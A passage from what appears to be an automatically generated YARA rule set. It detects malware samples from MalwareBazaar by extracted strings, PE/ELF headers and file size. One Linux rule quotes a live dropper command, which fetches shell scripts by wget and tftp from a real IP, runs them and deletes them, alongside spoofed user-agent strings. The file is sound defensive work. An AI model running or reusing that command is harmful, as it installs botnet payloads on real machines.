        $s18 = "hProcess"
        $s19 = "lpThreadAttributes"
        $s20 = "lpThreadId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1030KB and
        all of them
}

rule Windows_1f6b987df79234bbf48b62410263ca081a8340b2102b1934b0d01dfd4188f610
{
    meta:
        description = "Auto ML: 1f6b987df79234bbf48b62410263ca081a8340b2102b1934b0d01dfd4188f610"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "CRYPT32.dll"
        $s19 = "SHLWAPI.dll"
        $s20 = "gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB and
        all of them
}

rule Windows_1f80a5027a30b618996426f0c02d630d7b275351f524fd9b5644e9f6db779be9
{
    meta:
        description = "Auto ML: 1f80a5027a30b618996426f0c02d630d7b275351f524fd9b5644e9f6db779be9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "kernel32.dll"
        $s4 = "user32.dll"
        $s5 = "advapi32.dll"
        $s6 = "oleaut32.dll"
        $s7 = "shell32.dll"
        $s8 = "version.dll"
        $s9 = "mscoree.dll"
        $s10 = "GetModuleHandleA"
        $s11 = "GetProcAddress"
        $s12 = "ExitProcess"
        $s13 = "LoadLibraryA"
        $s14 = "RegCloseKey"
        $s15 = "CreateFontA"
        $s16 = "ShellExecuteA"
        $s17 = "GetFileVersionInfoA"
        $s18 = "StringFileInfo"
        $s19 = "FileDescription"
        $s20 = "FileVersion"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1332KB and
        all of them
}

rule Windows_1f98c29e6250eb8ff1185ef45b6fc1b6e2ad19ecc127ba6406ce68a778206683
{
    meta:
        description = "Auto ML: 1f98c29e6250eb8ff1185ef45b6fc1b6e2ad19ecc127ba6406ce68a778206683"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1662KB and
        all of them
}

rule Windows_1fa544646d6c53b124a6c43bdb0479fcd254e74dafe992c537ad40d7b7d0a850
{
    meta:
        description = "Auto ML: 1fa544646d6c53b124a6c43bdb0479fcd254e74dafe992c537ad40d7b7d0a850"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4759KB and
        all of them
}

rule Linux_1fc5df840917e7503fcac4be3c2886426fbb9fa70f4d3b45f5b1ec8baad56bf6
{
    meta:
        description = "Auto ML: 1fc5df840917e7503fcac4be3c2886426fbb9fa70f4d3b45f5b1ec8baad56bf6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "connect"
        $s2 = "sigemptyset"
        $s3 = "getpid"
        $s4 = "readlink"
        $s5 = "socket"
        $s6 = "readdir"
        $s7 = "sigaddset"
        $s8 = "write"
        $s9 = "setsockopt"
        $s10 = "read"
        $s11 = "memset"
        $s12 = "getppid"
        $s13 = "opendir"
        $s14 = "getsockopt"
        $s15 = "open"
        $s16 = "setsid"
        $s17 = "closedir"
        $s18 = "close"
        $s19 = "getsockname"
        $s20 = ".text"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB and
        all of them
}

rule Windows_1ff483be03e1ed1b9dba67315b7fdc98d9ea3bdd015a30acc4e6d37265451aa3
{
    meta:
        description = "Auto ML: 1ff483be03e1ed1b9dba67315b7fdc98d9ea3bdd015a30acc4e6d37265451aa3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4594KB and
        all of them
}

rule Windows_202ebcf24cd4b6a4394e7dddd7ee98bceb9ac2b8c281e9f4610c7a93dafaa959
{
    meta:
        description = "Auto ML: 202ebcf24cd4b6a4394e7dddd7ee98bceb9ac2b8c281e9f4610c7a93dafaa959"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetWindowsVersion>g__HKLM_GetString|11_0"
        $s5 = "<GetScanArgs>b__5_0"
        $s6 = "Microsoft.Win32"
        $s7 = "<GetTokens>d__2"
        $s8 = "<Module>"
        $s9 = "System.Drawing.Drawing2D"
        $s10 = "get_ReleaseID"
        $s11 = "set_ReleaseID"
        $s12 = "get_TaskID"
        $s13 = "set_TaskID"
        $s14 = "get_ASCII"
        $s15 = "get_JSON"
        $s16 = "get_ScanVPN"
        $s17 = "set_ScanVPN"
        $s18 = "System.IO"
        $s19 = "get_BlockedIP"
        $s20 = "set_BlockedIP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB and
        all of them
}

rule Windows_0226f207e06535060dc26c905ddf0956626b8df17bc4e2c28ebbd0bd69abf9f3
{
    meta:
        description = "Auto ML: 0226f207e06535060dc26c905ddf0956626b8df17bc4e2c28ebbd0bd69abf9f3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4412KB and
        all of them
}

rule Windows_20605540e34581146556911980568ab5cea655e86b2899898626e093fd071c3d
{
    meta:
        description = "Auto ML: 20605540e34581146556911980568ab5cea655e86b2899898626e093fd071c3d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5088KB and
        all of them
}

rule Linux_207432f6e686430cf0d528762e8a1685b2d3d778a92b56886939861eaa14dedf
{
    meta:
        description = "Auto ML: 207432f6e686430cf0d528762e8a1685b2d3d778a92b56886939861eaa14dedf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 128KB and
        all of them
}

rule Windows_20761b3cb614e078d165cf47da120127e86bb0a8ab862dc32b022f9e351abff3
{
    meta:
        description = "Auto ML: 20761b3cb614e078d165cf47da120127e86bb0a8ab862dc32b022f9e351abff3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "RegOpenKeyExW"
        $s13 = "RegCreateKeyExW"
        $s14 = "ADVAPI32.dll"
        $s15 = "SHFileOperationW"
        $s16 = "SHGetFileInfoW"
        $s17 = "SHGetPathFromIDListW"
        $s18 = "ShellExecuteExW"
        $s19 = "SHELL32.dll"
        $s20 = "CoCreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB and
        all of them
}

rule Linux_2080c144d101ab9cf6584e61c7cae32b3afeeb6a0a89daec22296b554266e18c
{
    meta:
        description = "Auto ML: 2080c144d101ab9cf6584e61c7cae32b3afeeb6a0a89daec22296b554266e18c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB and
        all of them
}

rule Windows_209fb76e62610c2de55f2c539ef64f1ed58b00109579c4b3cc784c526bb2518a
{
    meta:
        description = "Auto ML: 209fb76e62610c2de55f2c539ef64f1ed58b00109579c4b3cc784c526bb2518a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "kernel32.dll"
        $s3 = "GetModuleHandleA"
        $s4 = "mscoree.dll"
        $s5 = "If you want to change the Windows User Account Control level replace the"
        $s6 = "requestedExecutionLevel node with one of the following."
        $s7 = "<requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s8 = "Specifying requestedExecutionLevel element will disable file and registry virtualization."
        $s9 = "<defaultAssemblyRequest permissionSetReference=\"Custom\" />"
        $s10 = "<PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" Unrestricted=\"true\" ID=\"Custom\" SameSite=\"site\" />"
        $s11 = "<!-- A list of the Windows versions that this application has been tested on"
        $s12 = "and Windows will automatically select the most compatible environment. -->"
        $s13 = "<!-- Windows Vista -->"
        $s14 = "<!-- Windows 7 -->"
        $s15 = "<!-- Windows 8 -->"
        $s16 = "<!-- Windows 8.1 -->"
        $s17 = "<!-- Windows 10 -->"
        $s18 = "<!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher"
        $s19 = "DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need"
        $s20 = "to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5714KB and
        all of them
}

rule Windows_20c71940fe5d447f7561bc731545b698a3632dfda6022194f0dfaf9500a3ac59
{
    meta:
        description = "Auto ML: 20c71940fe5d447f7561bc731545b698a3632dfda6022194f0dfaf9500a3ac59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<ReadFileFromLocalAsync>d__40"
        $s5 = "<StartTempFileCleanup>b__21_0"
        $s6 = "get_Item1"
        $s7 = "Microsoft.Win32"
        $s8 = "ReadInt32"
        $s9 = "<EnsureFileIsUpToDateAsync>d__42"
        $s10 = "get_Item2"
        $s11 = "get_TelemetryLogger2"
        $s12 = "set_TelemetryLogger2"
        $s13 = "<GetFile>d__23"
        $s14 = "<GetFileAndInstrumentAsync>d__43"
        $s15 = "<WriteAsync>d__3"
        $s16 = "<ReadAllAsync>d__4"
        $s17 = "<ReadAsync>d__5"
        $s18 = "<Microsoft-VisualStudio-RemoteControl-IRemoteControlHTTPRequestor-GetFileFromServerAsync>d__16"
        $s19 = "<ReadAsync>d__6"
        $s20 = "<Microsoft-VisualStudio-RemoteControl-IRemoteControlHTTPRequestor-GetFileFromCacheAsync>d__17"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 355KB and
        all of them
}

rule Windows_20ec3bec0465f43ae42fdd9a1689c7cd9290e8fd4f97eaaf7bf94decb61a09bb
{
    meta:
        description = "Auto ML: 20ec3bec0465f43ae42fdd9a1689c7cd9290e8fd4f97eaaf7bf94decb61a09bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "map/set too long"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2394KB and
        all of them
}

rule Windows_20f562d699b8a5fd2c0af6acf8b27124e57b372f78a9190e1d7fe9d739b9d816
{
    meta:
        description = "Auto ML: 20f562d699b8a5fd2c0af6acf8b27124e57b372f78a9190e1d7fe9d739b9d816"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4827KB and
        all of them
}

rule Windows_2101b0cbc46567edd0a5c6bdc673e5ac2dad20ca8b3b6bb00d88566dea9ee5ed
{
    meta:
        description = "Auto ML: 2101b0cbc46567edd0a5c6bdc673e5ac2dad20ca8b3b6bb00d88566dea9ee5ed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "System"
        $s6 = "kernel32.dll"
        $s7 = "GetLongPathNameA"
        $s8 = "Windows"
        $s9 = "GetMem."
        $s10 = "TFileName"
        $s11 = "TFormatSettings"
        $s12 = "TThreadLocalCounter"
        $s13 = "$TMultiReadExclusiveWriteSynchronizer"
        $s14 = "GetDiskFreeSpaceExA"
        $s15 = "oleaut32.dll"
        $s16 = "VariantChangeTypeEx"
        $s17 = "EVariantArrayCreateError"
        $s18 = "IOleWindow"
        $s19 = "bdRightToLeftReadingOnly"
        $s20 = "EFileStreamError"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 3882KB and
        all of them
}

rule Windows_211560aabd0a46ef0dde5f5a94bfefa3d1cad47ae133f526844d19dc623aad20
{
    meta:
        description = "Auto ML: 211560aabd0a46ef0dde5f5a94bfefa3d1cad47ae133f526844d19dc623aad20"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4761KB and
        all of them
}

rule Linux_0242a019e991b897de267fed696652c2f243ba4fe193dd1a53942e11fa07a225
{
    meta:
        description = "Auto ML: 0242a019e991b897de267fed696652c2f243ba4fe193dd1a53942e11fa07a225"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "GETv"
        $s2 = "HTTP/1.1"
        $s3 = "User-Ag"
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB and
        all of them
}

rule Windows_2145cc1bb4315c608aa187ccbabe3aa5699d71727aa65a2b0fef88f01e21c377
{
    meta:
        description = "Auto ML: 2145cc1bb4315c608aa187ccbabe3aa5699d71727aa65a2b0fef88f01e21c377"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "CorExitProcess"
        $s7 = "An application has made an attempt to load the C runtime library incorrectly."
        $s8 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s9 = "- Attempt to initialize the CRT more than once."
        $s10 = "- unable to open console device"
        $s11 = "- unexpected multithread lock error"
        $s12 = "- not enough space for thread data"
        $s13 = "- floating point support not loaded"
        $s14 = "GetProcessWindowStation"
        $s15 = "GetUserObjectInformationA"
        $s16 = "GetLastActivePopup"
        $s17 = "GetActiveWindow"
        $s18 = "USER32.DLL"
        $s19 = "NetConnectionEnum"
        $s20 = "NetUserSetGroups"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2196KB and
        all of them
}

rule Windows_216af63fedbf9379d7d2f6b52eb81d3b19a1310fa0cb365a6121788b2b48baa0
{
    meta:
        description = "Auto ML: 216af63fedbf9379d7d2f6b52eb81d3b19a1310fa0cb365a6121788b2b48baa0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "System.Runtime.CompilerServices"
        $s4 = "System"
        $s5 = "System.Diagnostics"
        $s6 = "System.Reflection"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "AssemblyFileVersionAttribute"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "System.Resources"
        $s12 = "AssemblyKeyFileAttribute"
        $s13 = "ConsoleApp1.exe"
        $s14 = "<Module>"
        $s15 = "Setup"
        $s16 = "<Module>{9284E368-9825-43D7-B991-8B728CE74EE6}"
        $s17 = "Unicom.Uniworks.CModule.BaseForm"
        $s18 = "FrmTestWmsItemPrint"
        $s19 = "FrmProcessBase"
        $s20 = "<Module>{95FAF434-F0C3-4DD4-996F-800A86BF1838}"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5381KB and
        all of them
}

rule Windows_21752d701ba9884a7a56ace43ae613d368696e26462f77dbc702191c7161a519
{
    meta:
        description = "Auto ML: 21752d701ba9884a7a56ace43ae613d368696e26462f77dbc702191c7161a519"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "MSVCRT.dll"
        $s6 = "_acmdln"
        $s7 = "__getmainargs"
        $s8 = "__setusermatherr"
        $s9 = "__set_app_type"
        $s10 = "GetModuleHandleA"
        $s11 = "GetStartupInfoA"
        $s12 = "KERNEL32.dll"
        $s13 = "LoadIconA"
        $s14 = "SetTimer"
        $s15 = "GetSystemMenu"
        $s16 = "GetClientRect"
        $s17 = "GetSystemMetrics"
        $s18 = "EnableWindow"
        $s19 = "USER32.dll"
        $s20 = "_setmbcp"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 266KB and
        all of them
}

rule Windows_21a3834ec6d51ba3426b21c6fda50146e7e6d0ba774fcd03917f722ef33235dd
{
    meta:
        description = "Auto ML: 21a3834ec6d51ba3426b21c6fda50146e7e6d0ba774fcd03917f722ef33235dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "kernel32.dll"
        $s3 = "GetModuleHandleA"
        $s4 = "mscoree.dll"
        $s5 = "If you want to change the Windows User Account Control level replace the"
        $s6 = "requestedExecutionLevel node with one of the following."
        $s7 = "<requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s8 = "Specifying requestedExecutionLevel element will disable file and registry virtualization."
        $s9 = "<defaultAssemblyRequest permissionSetReference=\"Custom\" />"
        $s10 = "<PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" Unrestricted=\"true\" ID=\"Custom\" SameSite=\"site\" />"
        $s11 = "<!-- A list of the Windows versions that this application has been tested on"
        $s12 = "and Windows will automatically select the most compatible environment. -->"
        $s13 = "<!-- Windows Vista -->"
        $s14 = "<!-- Windows 7 -->"
        $s15 = "<!-- Windows 8 -->"
        $s16 = "<!-- Windows 8.1 -->"
        $s17 = "<!-- Windows 10 -->"
        $s18 = "<!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher"
        $s19 = "DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need"
        $s20 = "to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2824KB and
        all of them
}

rule Windows_21b6126cd5074ab948e240f171ea4ae44c56184c252689fcb120971761fe26ab
{
    meta:
        description = "Auto ML: 21b6126cd5074ab948e240f171ea4ae44c56184c252689fcb120971761fe26ab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "fclose"
        $s6 = "fread"
        $s7 = "fopen"
        $s8 = "_beginthreadex"
        $s9 = "MSVCRT.dll"
        $s10 = "_acmdln"
        $s11 = "__getmainargs"
        $s12 = "__setusermatherr"
        $s13 = "__set_app_type"
        $s14 = "GetPrivateProfileStringA"
        $s15 = "GetPrivateProfileIntA"
        $s16 = "DeleteCriticalSection"
        $s17 = "WinExec"
        $s18 = "GetModuleFileNameA"
        $s19 = "WritePrivateProfileStringA"
        $s20 = "GetProcAddress"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 796KB and
        all of them
}

rule Windows_21c6dd94577eb8a7f102656f638e4bdbac0fdb457c6dbd902a474b9c8b42a201
{
    meta:
        description = "Auto ML: 21c6dd94577eb8a7f102656f638e4bdbac0fdb457c6dbd902a474b9c8b42a201"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ntgetfe"
        $s5 = "<Module>"
        $s6 = "System.Runtime.InteropServices"
        $s7 = "System.Reflection"
        $s8 = "System"
        $s9 = "System.IO"
        $s10 = "m_OutWindow"
        $s11 = "SetDictionarySize"
        $s12 = "SetLiteralProperties"
        $s13 = "SetPosBitsProperties"
        $s14 = "SetDecoderProperties"
        $s15 = "GetLenToPosState"
        $s16 = "Create"
        $s17 = "GetState"
        $s18 = "OutWindow"
        $s19 = "_windowSize"
